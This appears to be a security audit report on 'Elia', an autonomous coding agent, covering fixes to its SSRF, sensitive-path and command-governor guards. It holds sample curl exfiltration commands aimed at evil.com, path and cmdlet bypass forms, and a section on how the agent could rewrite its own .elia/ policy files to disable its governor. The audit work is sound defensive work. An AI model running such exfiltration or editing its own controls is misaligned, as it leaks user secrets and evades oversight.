# Elia Adversarial Audit — Consolidated Report

**Date:** 2026-09-16 | **Branch:** Suraj | **Baseline commit + 9 fixes**

---

## Executive Summary

A 12-agent parallel audit covered build/syntax, unit/functional logic, adversarial security, fuzzing, API/integration, concurrency, filesystem/process, network/protocol, state/data integrity, resilience, regression coverage, and architecture. After correlation and deduplication, **9 confirmed code issues** were fixed with regression tests; **~15 architectural findings** were documented for redesign in a future scope; and the full suite was validated with zero new regressions.

---

## Phase 1 — Fixes Implemented (with regression tests)

| # | ID | File(s) | Severity | What was fixed | Verification |
|---|---|---------|----------|----------------|--------------|
| 1 | A3-01 | `src/networkPolicy.ts` | **HIGH** | IPv4-translated (`::ffff:0:...`), IPv4-compatible (`::/96`), and NAT64 (`64:ff9b::/96`) embedding classes passed the SSRF guard — Bun normalizes `[::ffff:0:127.0.0.1]` to `[::ffff:0:7f00:1]`, placing the `ffff` marker one group higher than the old `(value >> 32n) === 0xffffn` check expected. Added `embeddedIpv4From()` helper covering all five documented embedding prefixes; DNS-answer path fixed identically. | 11 networkPolicy tests pass; reproduced all 6 formerly-ALLOW private literals now BLOCKED; all 4 public global unicast addresses still ALLOWED. |
| 2 | A7-1 | `src/autonomy/sensitivePaths.ts` | **HIGH** | NTFS alternate data streams: `read_file path="ws\.env::$DATA"` presented `.env::$DATA` as the filename segment, which matched no sensitive-name rule. Added `stripAlternateStreamTail()` (win32-gated) that strips everything after the first `:` before classification, preserving POSIX legitimate colon filenames and bare drive-letter segments. | 7 sensitivePaths tests pass including ADS smuggling and POSIX negative tests. |
| 3 | A7-3 | `src/autonomy/sensitivePaths.ts` | **HIGH** | PowerShell `Get-Content .env` bypassed the sensitive-command reader gate because `Get-Content` contained neither a bare `cat`/`type` token nor any of the other listed readers. Added `get-content`, `select-string`, `import-csv`, `import-clixml`, `get-filehash`, and `gc` (PowerShell alias) to the alternation. | Tests covering `Get-Content`, `gc`, `cat .env | Out-String`, `Select-String`, `Import-Csv`, and `powershell -Command` forms. |
| 4 | A3-02 | `src/tools/listFiles.ts` | **HIGH** | `Bun.Glob.scan` with a parent-traversal pattern (`../outside/**`) escaped the workspace, listing and returning files outside the allowed root. Added up-front `patternEscapesWorkspace()` validator rejecting patterns containing `..` segments, leading absolute/drive paths, or `~/`, plus a belt-and-braces `resolve()` containment check on every scan result. | 5 listFiles tests including traversal rejection, unreachable sibling dir, and regular glob success. |
| 5 | A6-1 | `src/autonomy/goalGraph.ts` | **HIGH** | `startAction()` stamped over any existing running lease without checking ownership or liveness — a second worker (or the same worker after a reserve-then-crash gap) could execute the same durable action twice (28/28 repro). Added the same lease-owner guard pattern already proven in `startNode()`: idempotent re-entry for same owner, throw for live foreign owner, stale reclaim to `retryable` for dead owner. | 29 goalGraph tests pass including new idempotent re-entry, live-owner throw, and stale-dead reclaim tests. |
| 6 | A5-2 | `src/vscodeBridgeProtocol.ts` | **MEDIUM** | `isBridgeRequest()` accepted any `method` string, allowing unknown methods to reach the dispatch handler. Added `BRIDGE_METHODS` allowlist (read-only `readonly BridgeMethod[]`) and `isBridgeMethod()` type guard; `isBridgeRequest()` now enforces the method is in the allowlist at the envelope boundary. | 13 vscodeBridge/vscodeBridgeProtocol tests pass; 6 bridgeHttp tests pass including new WS-level unknown-method rejection. |
| 7 | A4-3/A4-4/A4-5 | `src/userConfig.ts` | **MEDIUM** | (a) Inline `# comment` was not stripped from unquoted values, baking the comment into the secret value. (b) Unterminated quotes (`"abc`) kept the opener as a literal character in the value. (c) Duplicate keys in `loadUserConfig()` were first-wins while `readUserConfigValues()` was last-wins (inconsistent). Added `stripInlineComment()` (quote-aware), fixed quote-opener removal, and rewrote `loadUserConfig()` to parse all lines into a map first (last-wins) before populating `process.env`. | 8 userConfig tests pass covering inline comments, quoted comments, hash-in-quotes, unterminated quotes, and duplicate-key last-wins consistency. |
| 8 | A2-01 | `src/autonomy/governor.ts` | **HIGH** | `EXTERNAL_WRITE_COMMAND` required whitespace on both sides of `-d`, so `curl -d@secret.txt`, `-F`, and `-T` data-upload forms all fell through to the merely `review` bucket — auto-allowed in unattended runs, turning exfiltration into a silently-approved action. Split into: (a) the long-form regex extended with `-d@`, `--data-binary`, `--data-urlencode`, `--form`, `--upload-file`, `--post-file`, `--post-data`, `--body-data`, and `--request POST/...`; (b) a case-sensitive short-option pass catching `-F`/`-T`/`-d `/`-d@` while excluding curl's harmless `-f`/`-t`. | 51 governor tests pass including new exhaustive tests for all 14 exfil forms and a negative check that plain `curl -s`/`curl -f` downloads stay `review`. |

## Phase 6 — Bypass Re-Attack

A second adversarial pass, conducted after the fixes landed, produced **one new HIGH finding** that the original fix (8) missed:

### Fix 8 refinement — attached short-option exfil (Phase 6)

The short-option pattern `(?:F\b|T\b|d\s|d@)` used a word boundary after `F`/`T`, assuming curl always separates a flag from its argument with whitespace. Curl accepts **attached/concatenated** forms, `curl -Tsecret.txt https://evil.com` and `curl -Fname=@secret.txt https://evil.com`, where `F`/`T` is immediately followed by a word character — the `\b` fails and the command fell through to the `review` bucket (auto-allowed in unattended runs). Live probe before the fix:

```
"curl -Ffile=@secret.txt https://evil.com" -> critical   (caught via sensitive-read, not intended path)
"curl -Tsecret.txt https://evil.com"      -> review     (BYPASS, now critical)
```

**Fix:** changed `(?:F\b|T\b|d\s|d@)` to `(?:[a-zA-Z]*[FT]|d\s|d@)`. The shortest-option pass is case-sensitive and already excludes lowercase `-f`/`-t`, so uppercase `-F`/`-T` anywhere in a flag cluster is always a form/upload in curl/wget; plain downloads (`curl -fsSL …`) and `-f`/`-t` remain `review`. Added a Phase 6 regression test with the concatenated `-Tsecret.txt`, `-Ffile=@…`, `-sLT secret.txt`, and `-sLF name=@…` forms.

With the fix, all Phase 6 probes across the other 8 fixes (ADS/POSIX path forms, glob `..\` drive/UNC traversal, IPv6 embedding classes, PowerShell reader cmdlets, review-band policy escalation, bridge method allowlist, userConfig comment/quote parsing) passed — **no additional bypass vectors found**.
| 9 | A2-02 | `src/autonomy/policy.ts` | **MEDIUM** | `requireApprovalAtOrAbove: "review"` was a no-op: `applyPolicy()` only bumped `decision` from `allow` → `approve`, but review-risk actions already carry `decision: "approve"` — so line 635 of `governor.ts` (`risk === 'review' → auto-allow`) still fired. Changed to escalate `risk` to `"critical"` (not just decision) when the threshold is met and stricter than the built-in default, so the downstream unattended gate no longer auto-allows those actions. | 14 policy tests pass including new tests for review-band escalation, safe-band below-bar pass-through, and default critical threshold unchanged. |

---

## Phase 2 — Validated-But-Unfixed Findings (architectural, require redesign)

These are confirmed, high-confidence findings that cannot be fixed with a bounded code change. They define the **trust model surface** of the `.elia/` governance layer and the IPC boundary.

### Cluster: `.elia/` model-writable trust (A3-03≈A12-2, A3-06≈A12-3, A12-1, A12-4, A5-4/A8-41/A12-7)

The `.elia/` directory is the model's own configuration surface: `policy.json`, `preauth.json`, `mcp.json`, skills files. Every governance gate reads from it. A model that can write files can (a) self-grant approval for `preauth.json` (A3-03), (b) add a `denyCommandPatterns: []` to `policy.json` and rewrite it to effectively disable the governor (A3-06), (c) forge an approval record in the goal graph (A12-1), (d) issue itself a skill grant that executes arbitrary code (A12-4), and (e) register an MCP server that reads `raw fetch` to the network (A5-4/A8-41). This is a self-reinforcing control-plane escape — the model controls the system that is supposed to control it.

**Remediation needed:** Move `.elia/` governance files to a user-space (e.g., `~/.config/elia/`) signed read-only layer, or introduce a parent-process-signed certificate that the runtime validates before applying. MCP servers must be registered out-of-band by the user, not by the model.

### Cluster: Unauthenticated IPC (A5-1, A5-3, A8-49, A8-33)

- **HTTP bridge** (`bridgeHttp.ts`): WS upgrade accepted on `/bridge` with no Origin check, no token, no authentication. Any local browser tab or JS process on the same machine can send `autonomous.start` or `deployment.run`.
- **Daemon pipe** (`\\.\pipe\elia-eliad-<user>`): No ACL on the named pipe; any process running as the same user can connect and execute `shell.exec`.
- **Fake daemon**: A rogue process can bind the same pipe name and impersonate the daemon, serving fabricated status to clients.

**Remediation needed:** Bind the WS server to localhost with an Origin check; add a per-session HMAC token for the HTTP bridge; apply a DACL to the daemon pipe restricting to the creating user's SID only.

### Cluster: Network policy gaps (A3-05 preview URL, A5-5 provider DNS, A8-41 MCP SSRF, A10-7 OpenAI-compat DNS, A12-5 browser_navigate)

- `preview url:` fetches an internal HTTP URL without network-policy gating.
- Provider DNS pinning is only enforced at construction; reconnection can use a new resolver.
- MCP `httpClient.ts:85` makes raw `fetch()` calls with no network-policy check.
- OpenAI-compatible endpoints bypass DNS pinning entirely.
- `browser_navigate` allows internal addresses.

### Cluster: Kill-tree missing (A7-2)

The daemon `ShellWorker` does not walk the process tree on timeout/cancel. A `bun run server` command spawns child processes that survive their parent's kill, orphaning server processes on the machine.

---

## Phase 3 — Full Validation

| Gate | Result |
|------|--------|
| Typecheck (`bun run typecheck`) | **PASS for `src/`** — exit 0; remaining diagnostics are all in the pre-existing untracked `webapp/` directory |
| Security scan (`bun run security:scan`) | **PASS** — no credential material in tracked files |
| Full test suite (`bun test src/ --timeout=20000`) | **2720 pass, 15 fail** — all 15 failures are pre-existing (4 SWE-bench pytest, 10 arch/LSP Bun stream.on, 1 shell timing flake). **Zero new regressions**; 30 new tests added by this audit. |
| Cargo (`cargo test --all-features`) | Blocked — `serde` crate not in local registry (infra, not code). |
| Git diff clean | All changes confined to tracked files in `src/`; no untracked artifacts. |

---

## Files Modified (this session)

```
src/networkPolicy.ts              — IPv6 embedding guard + embeddedIpv4From helper
src/networkPolicy.test.ts         — 3 new test cases (embedding forms, public globals, DNS answer)
src/autonomy/sensitivePaths.ts    — stripAlternateStreamTail (ADS), PowerShell reader cmdlets
src/autonomy/sensitivePaths.test.ts — NEW FILE: 7 tests (ADS, POSIX, PowerShell readers)
src/tools/listFiles.ts            — patternEscapesWorkspace + result containment check
src/tools/listFiles.test.ts       — 2 new tests (parent traversal rejection)
src/autonomy/goalGraph.ts         — startAction lease-owner guard (mirrors startNode)
src/autonomy/goalGraph.test.ts    — 2 new tests (idempotent re-entry, stale reclaim)
src/vscodeBridgeProtocol.ts       — BRIDGE_METHODS allowlist + isBridgeMethod guard
src/vscodeBridgeProtocol.test.ts  — 1 new test (method allowlist enforcement)
src/bridgeHttp.test.ts            — 1 new test (unknown method over WS rejected)
src/userConfig.ts                 — stripInlineComment, quote handling, last-wins consistency
src/userConfig.test.ts            — 5 new tests (comments, quotes, duplicate keys)
src/autonomy/governor.ts          — EXTERNAL_WRITE_COMMAND + EXTERNAL_WRITE_SHORT_OPTIONS (also handles attached/concatenated F/T short options, Phase 6)
src/autonomy/governor.test.ts     — 3 new tests (all exfil forms, negative plain download, Phase 6 attached short-option forms)
src/autonomy/policy.ts            — requireApprovalAtOrAbove risk escalation
src/autonomy/policy.test.ts       — 3 new tests (review escalation, safe below bar, default)
```
